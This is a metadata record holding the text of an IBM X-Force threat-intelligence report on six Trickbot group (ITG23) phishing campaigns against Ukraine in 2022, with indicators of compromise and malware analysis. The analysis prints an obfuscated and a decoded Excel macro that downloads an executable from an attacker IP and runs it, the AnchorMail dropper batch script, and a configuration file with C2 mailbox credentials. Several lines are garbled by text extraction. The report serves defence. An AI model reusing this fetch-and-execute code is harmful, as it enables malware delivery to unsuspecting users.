{
    "id": "78cd3d36-b8f6-4e18-9ed1-b54ad39ddb94",
    "created_at": "2023-01-12T15:00:01.375262Z",
    "updated_at": "2025-03-27T02:16:22.898042Z",
    "deleted_at": null,
    "sha1_hash": "91e7c419dd8e2b7fab500e981354dedab3a040ea",
    "title": "2022-07-07 - Unprecedented Shift- The Trickbot Group is Systematically Attacking Ukraine",
    "authors": "",
    "file_creation_date": "2022-07-18T18:10:14Z",
    "file_modification_date": "2022-07-18T18:10:14Z",
    "file_size": 1893287,
    "plain_text": "# Unprecedented Shift: The Trickbot Group is Systematically Attacking Ukraine\n\n**securityintelligence.com/posts/trickbot-group-systematically-attacking-ukraine**\n\n[Intelligence & Analytics\nJuly 7, 2022](https://securityintelligence.com/category/topics/security-intelligence-analytics/)\nBy [Ole Villadsen co-authored by\nCharlotte Hammond\n,](https://securityintelligence.com/author/ole-villadsen/) [Kat Weinberger\n13 min read](https://securityintelligence.com/author/kat-weinberger/)\nFollowing ongoing research our team, IBM Security X-Force has uncovered evidence indicating that the Russia-based cybercriminal syndicate\n“Trickbot group” has been systematically attacking Ukraine since the Russian invasion — an unprecedented shift as the group had not\n[previously targeted Ukraine. Between mid-April and mid-June of 2022 the Trickbot group, tracked by X-Force as ITG23 and also known as](https://securityintelligence.com/posts/itg23-crypters-cooperation-between-cybercriminal-groups/)\nWizard Spider, DEV-0193, and the Conti group, has conducted at least six campaigns — two of which have been discovered by X-Force —\nagainst Ukraine, during which they deployed IcedID, CobaltStrike, AnchorMail, and Meterpreter. Prior to the Russian invasion, ITG23 had not\nbeen known to target Ukraine, and much of the group’s malware was even configured to not execute on systems if the Ukrainian language was\ndetected.\n\n\n-----\n\nG 3 s ca pa g s aga st U a e a e otab e due to t e e te t to c t s act ty d e s o sto ca p ecede t a d t e act t at t ese\ncampaigns appeared specifically aimed at Ukraine with some payloads that suggest a higher degree of target selection.\n\nITG23 is a financially motivated cybercriminal gang known primarily for developing the Trickbot banking Trojan, which was first identified in\n2016; since that time the group has used its payloads to gain a foothold in victim environments for ransomware attacks, including Ryuk, Conti,\nand Diavol. The systematic attacks observed against Ukraine include reported and suspected phishing attacks against Ukrainian state\nauthorities, Ukrainian individuals and organizations, and the general population. Successful attacks that resulted in data theft or ransomware\nwould provide ITG23 with additional extortion opportunities, and particularly damaging attacks could harm Ukraine’s economy.\n\nThe observed activities reported in this blog highlight a trend of this group choosing targets that align with Russian state interests against the\nbackdrop of the ongoing conflict. In addition to an announcement by the Conti Ransomware group (which IBM tracks as part of ITG23) that\nthey [would act in support of Russian state interests at the beginning of the invasion of Ukraine, leaked chats between ITG23 members](https://www.reuters.com/technology/russia-based-ransomware-group-conti-issues-warning-kremlin-foes-2022-02-25/)\n[indicated that two senior individuals within the group had previously discussed in mid-April 2021 the targeting of entities that “work against the](https://www.wired.com/story/conti-ransomware-russia/)\nRussian Federation” and agreed that they were (Russian) “patriots.” Additionally, the Executive Director of Bellingcat claimed to have received\na tip that a cybercriminal group was in communication with Russia’s Federal Security Service (FSB).\n\nWhile investigating these campaigns, X-Force analysts also spotted new malware and tools being used by ITG23: a malicious Excel\ndownloader used to deliver the payloads, a self-extracting archive (SFX) designed to drop and build ITG23 payloads such as AnchorMail, and\n[a malware crypter X-Force has dubbed “Forest”. Of note, the Forest crypter has also been used with the Bumblebee malware, providing further](https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming)\nevidence that ITG23 is behind Bumblebee. In this article, we provide details on the six campaigns we identified and describe the new malware\nand tools used during these attacks.\n\n## Trickbot Group Campaigns Target Ukraine\n\nX-Force analysts have investigated at least six ITG23 campaigns specifically targeting Ukraine that took place between mid-April and midJune. Four of these campaigns have been disclosed by CERT-UA, which tracks them under the group name UAC-0098, while this analysis\nintroduces two newly uncovered campaigns by X-Force. Following our analysis of these campaigns, X-Force assesses:\n\nITG23 itself is controlling the delivery of the emails and malware — i.e., they are not executed by independent distribution affiliates. None\nof these campaigns are consistent with the techniques that known ITG23 third-party distribution affiliates are using to deliver the\n[payloads to their targets. In 2021, X-Force analysts tracked several campaigns that were probably carried out directly by ITG23](https://securityintelligence.com/posts/trickbot-gang-doubles-down-enterprise-infection/)\npersonnel.\nThree of the six campaigns use a malicious Excel downloader that has not been observed in other campaigns.\nTwo campaigns use ISO image files to distribute the payloads; these ISO files probably are created by a boutique ISO builder that has\nsupplied previous campaigns delivering ITG23 payloads.\nFive of the six campaigns directly download CobaltStrike, Meterpreter, or AnchorMail onto the target machine. Typically, these payloads\nare downloaded later during infections commencing with malware such as Trickbot, Emotet, or IcedID, suggesting these attacks are part\nof targeted campaigns during which ITG23 is willing to immediately deploy higher-value backdoors.\nThe CobaltStrike and IcedID payloads, which were used in four of the six campaigns, all use ITG23’s Tron, Hexa, or Forest crypters. The\npresence of an ITG23 crypter with a sample is a strong indication that its developer, distributor, or operator may either be part of ITG23 or\nhas a partnership with the group. Crypters are applications designed to encrypt and obfuscate malware to evade analysis by antivirus\nscanners and malware analysts.\n\n### Campaign #1: ITG23 Delivers IcedID in Mid-April\n\nIn mid-April, ITG23 used phishing emails to deliver a malicious Excel file (described in detail below) to targets in Ukraine that downloaded and\n[installed IcedID. ITG23 has a very close relationship with the IcedID group dating back several years and is likely relying on IcedID to obtain](https://securityintelligence.com/posts/itg23-crypters-cooperation-between-cybercriminal-groups/)\ninitial access into a victim’s environment after having discontinued the use of Trickbot and Bazarloader as of December 2021 and February\n[2022, respectively. According to CERT-UA, the campaign targeting consisted of “mass distribution among citizens” of Ukraine, suggesting less](https://cert.gov.ua/article/39609)\ndiscriminate targeting within the country. Malicious spreadsheets used the filenames “Список мобілізованих громадян.xls” (“List of mobilized\ncitizens.xls”), “Мобілізаційний список.xls” (“Mobilization list.xls”), and “Мобілізаційний реєстр.xls” (“Mobilization register.xls”). The IcedID\nsamples downloaded during this campaign used ITG23’s [Tron and Hexa crypters, further linking this campaign with ITG23.](https://securityintelligence.com/posts/itg23-crypters-cooperation-between-cybercriminal-groups/)\n\n**Campaign #1 IOCs:**\n\n**Type** **Indicator**\n\nExcel 1f3c5dd0a79323c57ad194a49eebaaf2f624822df401995e51a4c58b5a607a45\n\nExcel 08d30d6646117cd96320447042fb3857b4f82d80a92f31ee91b16044b87929c0\n\nExcel 9082c327ecf9c7bd9bd98c62a82e235165e8e11272998b63a66771da49be75f0\n\nExcel 8f7e3471c1bb2b264d1b8f298e7b7648dac84ffd8fb2125f3b2566353128e127\n\nExcel 65b208943d8cf82af902c39400bdd7a26fdbc94c23f9d4494cf0a2ca51233213\n\n\n-----\n\nExcel de7bcc556dde40d347b003d891f36c2a733131593ce2b9382f0bd9ade123d54a\n\nIcedID ac1d19c5942946f9eee6bc748dee032b97eb3ec3e4bb64fead3e5ac101fb1bc8 (Tron crypter)\n\nIcedID 55df2954add86715fc3d728459d79a6d2b88d34d9f23fafe9c5a573bb773d9e9 (Hexa crypter)\n\nStaging URL hxxp://66.150.66[.]167/su.dll\n\nStaging URL hxxp://66.150.66[.]167/asm1.dll\n\nStaging URL hxxp://168.100.8[.]42/cr.exe\n\nStaging URL hxxp://168.100.8[.]42/micro.exe\n\nStaging URL hxxp://168.100.8[.]42/spisok.exe\n\nStaging URL hxxp://168.100.8[.]42/list.exe\n\nIcedID C2 ertimadifa[.]com\n\nIcedID C2 rivertimad[.]com\n\n### Campaign #2: ITG23 Delivers CobaltStrike in Mid-April\n\nShortly after the above campaign in mid-April, ITG23 used a similar malicious Excel file to download a CobaltStrike sample which used the\nITG23 “Tron” crypter. CERT-UA called this campaign a “cyberattack on state organizations of Ukraine” and disclosed that the attacker used\nemails with the subject “Срочно! Деблокация Азовстали Терміново! Розблокування «Азовсталі»“ (“Urgent! Unblocking Azovstal Urgently!\nUnlocking “Azovstal”). A malicious Excel spreadsheet used in this campaign was uploaded to the VirusTotal repository from Ukraine with the\nfilename “Військові на Азовсталі” (“The military in Azovstal”). The reported targeting of state organizations and direct download of\nCobaltStrike suggest this was a more targeted attack against specific victims.\n\n**Campaign #2 IOCs:**\n\n**Type** **Indicator**\n\nExcel ea9dae45f81fe3527c62ad7b84b03d19629014b1a0e346b6aa933e52b0929d8a\n\nCobaltStrike (CS) 9990fe0d8aac0b4a6040d5979afd822c2212d9aec2b90e5d10c0b15dee8d61b1\n\nStaging URL hxxp://138.68.229[.]0/pe.dll\n\nCS C2 hxxps://dezword[.]com:443/apiv8/getStatus\n\n### Campaign #3: ITG23 Delivers Meterpreter in Late-April\n\nIn late April, [CERT-UA released details of a phishing campaign delivering Meterpreter which they assessed was associated with the Trickbot](https://cert.gov.ua/article/39934)\ngroup. The campaign used emails with the subject “Укаs Преsіема Уврацп No 576/22 про безпрецtaемні заходп безпекп” (“Decree of the\nPress Office of the European Union No. 576/22 on uninterrupted security measures”) to deliver an ISO image file. CERT-UA stated that the\nattack was against “the state authorities of Ukraine.” Similar to campaign #2, the reported targeting of state organizations and direct download\nof Meterpreter suggest this campaign was directed at specific targets.\n\nX-Force analysts have uncovered additional information tying this ISO image file and campaign to ITG23. CERT-UA describes an execution\nsequence in which the embedded Microsoft Shortcut (LNK) file executes a PowerShell script “z.ps1” using the command “-exec bypass -w h file z.ps1” that drops a Ukrainian-themed decoy document and executes the Meterpreter executable (b.exe). A nearly identical execution\nsequence was used during an ITG23 campaign against Ukraine in late May (Campaign #5) described further below.\n\nWe suspect that these ISO images are being sourced from a builder using UltraISO or PyCdlib to create the disk images. ITG23 and its\ndistribution affiliates such as Hive0107 (aka TA578) previously have sourced ISOs that are probably from this builder. In February and March,\ntwo campaigns, one of which belonged to Hive0107, used ISO images to deliver IcedID that are similar to the ISOs used in late April\n(Campaign #3) and late May (Campaign #5) against Ukraine. For example:\n\nBoth ISOs contain LNK files created on the same machine “desktop-ouvurbp” and with other identical metadata.\nBoth ISOs use the same PowerShell command identified in April: “-exec bypass -w h -file z.ps1”.\nThe PowerShell script used in March is similar to those used in Campaigns #3 and #5 using the “Start-Process” command to drop a\ndecoy document and execute a PE file.\n\n**Campaign #3 IOCs:**\n\n**Type** **Indicator**\n\nLNK aa8de6a526ad97a967874ac6b2fb347b8f444dd126e7f7b3838a6822a7298c30\n\n\n-----\n\nMeterpreter 865fadf4aadd58cac4909de95fb5f4c1a9b194b9e1f84973b4266c9a464d196b\n\n**Related ISO images used in February and March 2022 to deliver IcedID:**\n\n**Type** **Indicator**\n\nISO 89e052bd182df8de5960784c663f962d44e058c8920a437f54ab75d03a7da3bd\n\nISO c129a8bf28d476a7280535f0ce192769d8cb1fa519bab306ff506c08cbcf7436\n\n### Campaign #4: ITG23 Delivers AnchorMail in Early May\n\nIn early May, X-Force discovered a campaign using a malicious Excel file very similar to those used in the first two campaigns that downloaded\n[AnchorMail, a backdoor developed by ITG23 and based on their AnchorDNS malware. It is unusual to see Anchor backdoors downloaded](https://securityintelligence.com/posts/new-malware-trickbot-anchordns-backdoor-upgrades-anchormail/)\ndirectly as the first stage of an attack; typically, they are installed later in the infection. Their use suggests that this campaign may have been\ntargeted against specific individuals or organizations, although we lack information on the specific target set.\n\nThe spreadsheet was uploaded to the VirusTotal repository on May 5 from Ukraine with the name Nuclear.xls – suggesting an alarming lure.\nThe file was downloaded from a domain using the Ukrainian country code top-level domain: “lviv.uz[.]ua”. When executed, the spreadsheet\ndownloads a WinRAR self-extracting archive (SFX) (see below for additional details) that delivers the AnchorMail backdoor. We have also\nidentified other ITG23 payloads using this SFX as part of their installation sequence, including IcedID and CobaltStrike.\n\n**Campaign #4 IOCs**\n\n**Type** **Indicator**\n\nStaging URL (Excel) hxxps://lviv.uz[.]ua/Nuclear.xls\n\nStaging URL (AnchorMail SFX) hxxp://193.149.176[.]172/atachment.exe\n\nExcel Downloader 3f3f12bb3490cd5ff4b742229ae35cacb81dc1608d4b2ed2a1b0fcdc398ef605\n\nAnchorMail SFX a53bd5a0fd1c8d0740ce7fd4d1609348a16239fff3371ac06c08ac6daa3e9228\n\n### Campaign #5: ITG23 Delivers CobaltStrike in Late May\n\nX-Force analysts have also identified an ITG23 campaign against Ukraine that likely took place in late May or early June. The campaign used\nan ISO image file created on May 31 that is very similar to the one described in Campaign #3 from late April. The ISO was uploaded to the\nVirusTotal repository on June 2, 2022, from Ukraine with the filename “ПовидомленняCN07.iso” (“Message CN07.iso”). The embedded\nMicrosoft Shortcut file executes the PowerShell file z.ps1 which drops a PDF decoy customs declarations form and executes a CobaltStrike\nexecutable (b.exe).\n\nThis CobaltStrike sample uses a new ITG23 malware crypter X-Force has dubbed “Forest” (see below for additional details). Notably, this new\nForest crypter is also being used with Bumblebee loader samples, adding further evidence that this new loader family is built and operated by\nITG23.\n\n**Campaign #5 IOCs:**\n\n**Type** **Indicator**\n\nISO ca9da17b4b24bb5b24cc4274cc7040525092dffdaa5922f4a381e5e21ebf33aa\n\nCobaltStrike (CS) 3622d825b2d8a5f280597459983f50dc0cad642cff0008f6f535d23173c4f953\n\nCS C2 hxxps://farenge[.]com/jquery-3.3.1.min.js\n\n### Campaign #6: ITG23 Delivers CobaltStrike in Mid-June\n\nX-Force analysts in mid-June identified a suspicious CobaltStrike sample using ITG23’s Tron crypter, suggesting a relationship to ITG23 or one\n[of its partners or affiliates. CERT-UA a few days later released a report indicating that this CobaltStrike sample was used in recent phishing](https://cert.gov.ua/article/339662)\nattacks against “critical infrastructure facilities of Ukraine.” To deliver the payload, the attacker used emails purporting to be from the\n“Державна податкова служба України” (“State Tax Service of Ukraine”) with the subject “Повідомпення про несплаry nодатку” (“Report\nnon-payment of the tax”) to deliver a malicious document titled “Накладення штрафних санкцій.docx” (“Imposition of penalties.docx”). The\ndocument was contained within a Zip archive titled “НакладенняШтрафнихСанкці.zip” (“Imposition of Penalty Sanctions.zip”).\n\nThe email and document lure contain information about requirements to pay taxes in Ukraine. Of note, the text in the document lure is identical\nto that posted on this web page about Ukrainian tax requirements. When opened, the malicious document uses the vulnerability CVE-202230190 (“Follina”) to download an html file that will in turn download and execute the CobaltStrike Beacon. Of note, the SSL Public Key\n\n\n-----\n\ne bedded t s eaco s de t ca to t e o e t e eaco used Ca pa g #5, d cat g t at t ese t o eaco s ca be t aced bac to\nthe same CobaltStrike Team Server installation.\n\n**Campaign #6 IOCs:**\n\n**Type** **Indicator**\n\nZIP Archive 7d53782fab972b8b70c6c7134598da25fd125c58c88a6d468464cee6c9dbe764\n\nDocument bc6898f0e66582ab92307809a409797749b49948fc265767579b224755b0a17b\n\nCobaltStrike (CS) 394cbab9eb87ef8ee795d184137ac2634b22a0a3e642534a55c1623a813c8a59\n\nStaging URL (html) hxxp://64.190.113[.]51:8000/\n\nStaging URL (CS) hxxp://5.199.173[.]152/ked.dll\n\nCS C2 hxxps://baidenfree[.]com/jquery-3.3.1.min.js\n\n## Attacks Signal Cybercriminal Support for Russian Interests\n\nITG23 activity has previously avoided Ukrainian targets. Russian-speaking criminal underground communities have long generally discouraged\nif not outright banned going after former Soviet countries and—while not relevant to Ukraine—members of the Commonwealth of Independent\nStates (CIS). This code of conduct likely came about to avoid creating victims in malware operators’ countries of residence, in large part to\navoid antagonizing law enforcement. It also had the added benefit of encouraging Russian-speaking criminal cooperation based on a shared\n[sense of us-versus-the-rest solidarity. According to an indictment released by the U.S. Department of Justice (DOJ) in 2021, ITG23 (the group](https://www.justice.gov/opa/pr/latvian-national-charged-alleged-role-transnational-cybercrime-organization)\nbehind Trickbot) operated from multiple former Soviet countries, including Belarus, Russia, and Ukraine.\n\nHowever, ideological divisions and allegiances have increasingly become apparent within the Russian-speaking cybercriminal ecosystem this\nyear, with ITG23 as a primary case study. Conti Ransomware group declared a pro-Russian stance early in the conflict, stating their\ncommitment to attack entities that would oppose Moscow. The [ContiLeaks, which exposed message logs and other files exchanged between](https://www.wired.com/story/conti-ransomware-russia/)\n[members of ITG23, were reportedly obtained and leaked by a Ukrainian researcher.](https://www.cnn.com/2022/03/30/politics/ukraine-hack-russian-ransomware-gang/index.html)\n\nAlthough we have yet to observe similar activity on a wider scale, these campaigns provide evidence that Ukraine is in the crosshairs of\nprominent Russian cybercriminal groups. Ukraine has been targeted with a wide variety of cyber activity leading up to and since the invasion,\n[including distributed-denial-of-service (DDoS) attacks and defacements and attempted destructive activity attributed to Russian state-](https://www.zscaler.com/blogs/security-research/danabot-launches-ddos-attack-against-ukrainian-ministry-defense)\nsponsored actors.\n\n## New ITG23 Malware, Tools Used in Attacks on Ukraine\n\nX-Force analysts detected several new malware and tools employed during these campaigns:\n\nA malicious Excel file used to download the payloads.\nA self-extracting archive (SFX) designed to drop and build ITG23 payloads such as AnchorMail, CobaltStrike, and IcedID.\nA new ITG23 malware crypter X-Force has dubbed “Forest.”\n\n### Malicious Excel Downloader\n\nThree of the six campaigns targeting Ukraine used similar malicious Excel downloaders. The malicious downloader code is stored as a simple\nmacro within the Excel file which is set to run upon opening the file, providing the user has macros enabled. If macros are disabled then the\nmalicious code is unable to run.\n\nThe macro code downloads a file from a hardcoded URL, saves it to the file system, and then executes the downloaded file. Two variants of\nthe code are present across the analyzed samples, one which downloads an executable file which it then runs without arguments, and a\nsecond which downloads a DLL file which it then runs using the Windows rundll32 command.\n\nThe samples all make use of basic obfuscation techniques within the macro code, with some function and variable names replaced with\nrandomly generated names, and strings values encoded in a hexadecimal ascii format and split into multiple parts. An example of one of the\nobfuscated macros is as follows:\n```\nSub Workbook_Open()\n  Application.ScreenUpdating = False\n  Dim xHttp: Set bnntwxnuvivrf = CreateObject(itslnwmojhejvmg(\"4d6963726f736f\") &\nitslnwmojhejvmg(\"66742e584d4c48545450\"))\n  Dim bStrm: Set krzbmwewmr = CreateObject(itslnwmojhejvmg(\"41646f64622e53747265\") & itslnwmojhejvmg(\"616d\"))\n  bnntwxnuvivrf.Open itslnwmojhejvmg(\"474554\"), itslnwmojhejvmg(\"687474703a2f2f3139332e3134392e3137\") &\nitslnwmojhejvmg(\"362e3137322f61746163686d656e742e657865\"), False\n  bnntwxnuvivrf.Send\n  Dim sweidpa As String\n\n```\n\n-----\n\n```\n     p ( pp )\n  With krzbmwewmr\n  .Type = 1\n  .Open\n  .write bnntwxnuvivrf.responseBody\n  .savetofile sweidpa & itslnwmojhejvmg(\"5c736572766963657a2e\") & itslnwmojhejvmg(\"657865\"), 2\n  End With\n  Shell (sweidpa & itslnwmojhejvmg(\"5c736572\") & itslnwmojhejvmg(\"766963657a2e657865\"))\n  Application.ScreenUpdating = True\n  End Sub\n\n```\nDecoding the strings results in the following cleaned up code:\n```\nSub Workbook_Open()\n  Application.ScreenUpdating = False\n  Dim xHttp: Set bnntwxnuvivrf = CreateObject(\"Microsoft.XMLHTTP\")\n  Dim bStrm: Set krzbmwewmr = CreateObject(\"Adodb.Stream\")\n  bnntwxnuvivrf.Open \"GET\", \"http://193.149.176.172/atachment.exe\", False\n  bnntwxnuvivrf.Send\n  Dim sweidpa As String\n  sweidpa = Environ(\"AppData\")\n  With krzbmwewmr\n  .Type = 1\n  .Open\n  .write bnntwxnuvivrf.responseBody\n  .savetofile Environ(\"AppData\") & \"\\servicez.exe\", 2\n  End With\n  Shell (Environ(\"AppData\") & \"\\servicez.exe\")\n  Application.ScreenUpdating = True\n  End Sub\n\n```\nThe download URL, file name, and save file path all differ across the samples, and are presented below. It is noted that the first sample\nappears to have a typo in the execution file name, which does not match the save file name, so this sample would not have executed correctly.\n\n**MD5 Hash** **Payload** **Download URL** **Save File Path** **Execution Path**\n\nb12fce712eeaf19f3982c9d6d3b1496c IcedID hxxp://168.100.8[.]42/cr.exe %AppData%\\putty.exe %AppData%\\pu\n\n3aa6bf4ed8c485717d767013d43f7cdb IcedID hxxp://66.150.66[.]167/su.dll C:\\Windows\\Tasks\\su.dll rundll32\nC:\\Windows\\Tas\nPluginInit\n\nbde692781f0e8bddad3bc5e0c7db62db IcedID hxxp://66.150.66[.]167/asm1.dll C:\\Windows\\Tasks\\asm1.dll rundll32\nC:\\Windows\\Tas\nPluginInit\n\nbdfca142fc1408ab2028019775a95a8a IcedID hxxp://168.100.8[.]42/micro.exe %AppData%\\slik.exe %AppData%\\slik\n\n9f33887a8e76c246753e71b896a904b3 IcedID hxxp://168.100.8[.]42/spisok.exe %AppData%\\runsx.exe %AppData%\\run\n\n5b4deca6a14eb777fdd882a712006303 IcedID hxxp://168.100.8[.]42/list.exe %AppData%\\grutyyr.exe %AppData%\\gru\n\n877f834e8788d05b625ba639b9318512 CobaltStrike hxxp://138.68.229[.]0/pe.dll C:\\Windows\\Tasks\\pe.dll rundll32\nC:\\Windows\\Tas\nDllRegisterServ\n\nfe91a76235e0ed82f8439a694da2815f AnchorMail hxxp://193.149.176[.]172/atachment.exe %AppData%\\servicez.exe %AppData%\\se\n\n### WinRAR Self Extracting Archive (SFX) Dropper\n\nThe final sample, used in the early-May attack, is particularly notable. It was observed downloading AnchorMail, which is an upgraded version\nof the AnchorDNS backdoor associated with the Trickbot Group (ITG23). [AnchorMail is notable for using an email-based C2 server which it](https://securityintelligence.com/posts/new-malware-trickbot-anchordns-backdoor-upgrades-anchormail/)\ncommunicates with using SMTP and IMAP protocols over TLS. The Anchor variants are stealthier backdoors, which were traditionally\nemployed by the group during direct attacks against higher priority targets, as such, it is unusual to see an Anchor sample downloaded directly\nby a maldoc during the first stage of a campaign.\n\nThe AnchorMail sample is also interesting as it makes use of a previously unobserved dropper, which uses a bundled builder tool to configure\nand generate the AnchorMail malware binary on-the-fly. A similar dropper has also been found in use with IcedID and CobaltStrike payloads.\n\nIn the case of the AnchorMail sample, the analyzed Dropper takes the form of a WinRAR self-extracting archive (SFX) which extracts a\ncollection of files, including script and executable files, to the directory C:\\windows\\tasks and then executes the first script file. One of the\nscripts is responsible for executing the AnchorMail builder tool named buildDelegate x64 exe A text file named conf txt is included with the\n\n\n-----\n\nd opped es a d s passed to t e bu de as a pa a ete s te t e co ta s t e des ed co gu at o o t e c o a a a e e\nbuilder parses the configuration file and uses the contents to build a configuration data block for AnchorMail which it encrypts and then injects\ninto a template DLL for the malware. The configured AnchorMail binary is then written to disk with the filename delegat.dll.\n\nThe dropper then executes the generated delegat.dll binary using the in-built Windows rundll32 command, and a second script is also\nexecuted which deletes the previously dropped files.\n\nFurther details about the dropper and builder tool are presented below.\n\nThe following files are extracted by the dropper:\n\n**File Name** **Size** **MD5 Hash**\n\n1.bat 172 edfd64119648cc41266f4bd70bf3a7de\n\n123.vbs 192 60b66414e86cbd63341c669b756dc749\n\n2.bat 180 dcff74d381b84b0fd6f777af08bb21c4\n\nbuildDelegate_x64.exe 1252864 5e0c898c1719e87098ec162bbe9cb804\n\nconf.txt 275 e2775ae56975427a71c737d6b7595f59\n\ndelegate_x64.dll 3358720 47f29e3b0fe89968ddb9517fd2378115\n\nThe initial file executed by the dropper is the script file 123.vbs, which runs the script file 1.bat, followed by 2.bat.\n\nFile 1.bat contains the following script:\n```\n@echo off\nbuildDelegate_x64.exe --conf=conf.txt --source=delegate_x64.dll --target=delegat.dll\nTIMEOUT /T 3\nrundll32 c:\\windows\\tasks\\delegat.dll,dllmain\nTIMEOUT /T 3\n\n```\nThis script executes the file buildDelegate_x64.exe with files conf.txt, delegate_x64.dll and delegat.dll passed as parameters.\n\nThe executable file buildDelegate_x64.exe is a builder tool for the AnchorMail malware and designed to inject a compiled template binary with\nspecified configuration values. This allows the operators of AnchorMail to easily update the configuration of AnchorMail samples without\n[having to recompile the malware from scratch each time. AnchorMail’s predecessor, AnchorDNS, was observed using a similar system.](https://www.kryptoslogic.com/blog/2021/07/adjusting-the-anchor/)\n\nIf executed without parameters, via the command line, buildDelegate_x64.exe outputs the following information:\n```\nusage: lackeyBuilder(.exe) --conf=<configure file> --source=<source file> --target=<target file>\n    config file fields:\n        period=<number of minutes between launch, max value (60 * 24 -1)>\n        mail=<email data>\n        email data: {user|password|imap server[:port]|smtp server[:port]} or {destination email address}\n        if first symbol of server is '*' - not using SSL for connecting\nexample conf file:\nperiod=35\nmail={[email protected]|myPwd|imap.usa.com|smtp.usa.com}\nmail={[email protected]|pwd12345|*imap.australian.com|*smtp.australian.com}\nmail={[email protected]}\nmail={[email protected]}\n\n```\nWhen executed with the correct parameters, buildDelegate_x64.exe takes the source DLL, in this case delegate_x64.dll, which is a template\nfor the AnchorMail malware, and modifies it with the configuration values which are specified in the file conf.txt. The builder parses the\ncontents of conf.txt, and uses them to construct a configuration block for AnchorMail.\n\nIn this instance, conf.txt contains the following contents:\n```\nperiod=10\nmail={[email protected]|ohvohNgaeT6Shoche8Ei|15906-28547.bacloud.info|15906-28547.bacloud.info}\nmail={[email protected]|doo9ahxuuBug9cuuV8ga|15906-28547.bacloud.info|15906-28547.bacloud.info}\nmail={[email protected]}\n\n```\nThe builder then generates a 16-byte XOR key and uses this to encrypt the configuration block. The configuration block and the XOR key are\nthen injected into the template binary, which contains the marker strings ‘YYYYYYYYYYYYYYYY’ and ‘ZZZZZZZZZZZZZZZZ’ to indicate the\nlocations in the binary where the configuration block and key should be written to. This updated binary is then saved as file delegat.dll.\n\nTh i t th t th t d DLL d l **t dll** i th i b ilt Wi d dll32 d\n\n\n-----\n\na y, t e sc pt e **bat s e ecuted** c de etes a t e d opped es e cept o t e ge e ated e de egat d\n\n**Select samples using the WinRAR SFX Dropper:**\n\n**Sample Family** **SHA256 Hash**\n\nAnchorMail a53bd5a0fd1c8d0740ce7fd4d1609348a16239fff3371ac06c08ac6daa3e9228\n\nCobaltStrike f4680ee5f8f449b454802e633f3cf28d9640db7dddb7fabaf812c55d65f0e7ad\n\nIcedID 5447b315d682df9a20105310a7c0dbd3874e8aaae78549d78b27987fff2c0d50\n\n### Forest Crypter Loads CobaltStrike, Bumblebee\n\nThe Forest crypter, also known as Bumblebee loader, is a loader/crypter associated with ITG23 that has been observed in the wild since April\n[2022. It has so far primarily been used with the Bumblebee malware, but samples have also been found loading CobaltStrike, such as the one](https://elis531989.medium.com/the-chronicles-of-bumblebee-the-hook-the-bee-and-the-trickbot-connection-686379311056)\nidentified above in Campaign #5.\n\nForest crypter stores its payload in multiple chunks across the data sections of the binary. Each chunk of data is decrypted and combined\ntogether. The constructed data is then decrypted using XOR and a generated key, and then goes through another round of unpacking to\ngenerate the final payload binary.\n\nThe loader is capable of executing both shellcode and PE payloads, with shellcode payloads executed directly and PE payloads executed\nindirectly via a hooking technique. The loader installs hooks within the library functions NtOpenFile, NtCreateSection and\nNtMapViewOfSection, such that when these APIs are called the loader’s own functions will be executed instead. The loader will then attempt\nto load the library ‘gdiplus.dll’ using the LoadLibraryW API, which in turn calls the abovementioned NT APIs and triggers the hooks. The hook\nfunctions copy the unpacked payload into a newly created section and return the base address to LoadLibraryW, which proceeds to load the\nmalicious payload thinking it is the legitimate gdiplus.dll.\n\n**Select samples using the Forest crypter:**\n\n**Sample Family** **SHA256 Hash**\n\nBumblebee 1b889f984f25b493c41a30fae0ade4c689f094b412953a8b033ebf44ae70d160\n\nCobaltStrike 3622d825b2d8a5f280597459983f50dc0cad642cff0008f6f535d23173c4f953\n\n## Recommendations\n\nEnsure anti-virus software and associated files are up to date.\nSearch for existing signs of the indicated IOCs in your environment.\nConsider blocking and or setting up detection for all URL and IP-based IOCs.\nKeep applications and operating systems running at the current released patch level.\nDo not install unapproved apps on a device that has access to the corporate network.\nExercise caution with attachments and links in emails.\n\n[Ole Villadsen](https://securityintelligence.com/author/ole-villadsen/)\nCyber Threat Hunt Analyst, IBM Security\n\nOle Villadsen is an analyst on the Threat Hunt & Discovery Team within IBM X-Force Incident Response and Intelligence Services (IRIS),\nwhere he investiga...\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-07 - Unprecedented Shift- The Trickbot Group is Systematically Attacking Ukraine.pdf"
    ],
    "report_names": [
        "2022-07-07 - Unprecedented Shift- The Trickbot Group is Systematically Attacking Ukraine.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "62585174-b1f8-47b1-9165-19b594160b01",
            "created_at": "2023-01-06T13:46:39.369991Z",
            "updated_at": "2025-03-27T02:00:03.065156Z",
            "deleted_at": null,
            "main_name": "TA578",
            "aliases": [],
            "source_name": "MISPGALAXY:TA578",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
